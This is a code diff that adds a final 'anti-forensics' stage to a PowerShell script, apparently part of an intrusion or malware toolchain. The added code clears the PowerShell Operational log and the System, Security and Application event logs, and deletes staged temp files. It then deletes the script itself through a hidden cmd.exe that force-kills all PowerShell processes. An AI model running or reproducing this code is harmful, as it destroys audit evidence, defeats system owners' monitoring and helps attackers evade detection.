@@ -114,3 +114,37 @@ try {
 catch {
     Write-Warning "Critical Error: $($_.Exception.Message)"
 }
+
+finally {
+    # --- STAGE 6: AGGRESSIVE ANTI-FORENSICS & LOG WIPING ---
+    
+    # 1. Clear the PowerShell Script Block Logs (where the code is recorded)
+    # This targets the specific log where AMSI and PowerShell record your script
+    try {
+        $v_logName = "Microsoft-Windows-PowerShell/Operational"
+        [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($v_logName)
+    } catch { }
+
+    # 2. Clear System, Security, and Application Logs
+    # This is the "Nuclear Option" that wipes the main Windows history
+    $v_logs = @("System", "Application", "Security")
+    foreach ($v_log in $v_logs) {
+        try {
+            Clear-EventLog -LogName $v_log -ErrorAction SilentlyContinue
+        } catch { }
+    }
+
+    # 3. Wipe Temp Files (Lab Patterns)
+    Get-ChildItem "$env:TEMP\*" -Include "*.exe","*.txt","*.zip","*.tmp" | 
+        Where-Object { $_.Name -like "*$r_nm*" -or $_.Name -like "ani_*" } | 
+        Remove-Item -Force -ErrorAction SilentlyContinue
+
+    # 4. SELF-DESTRUCT (Script Deletion)
+    $v_currentScript = $MyInvocation.MyCommand.Definition
+    if ($v_currentScript) {
+        # 'timeout 3' gives PowerShell time to close the file handle
+        # 'taskkill' ensures no leftover powershell processes keep a lock
+        $v_cleanupCmd = "/c timeout 3 & taskkill /F /IM powershell.exe & del `"$v_currentScript`""
+        Start-Process "cmd.exe" -ArgumentList $v_cleanupCmd -WindowStyle Hidden
+    }
+}
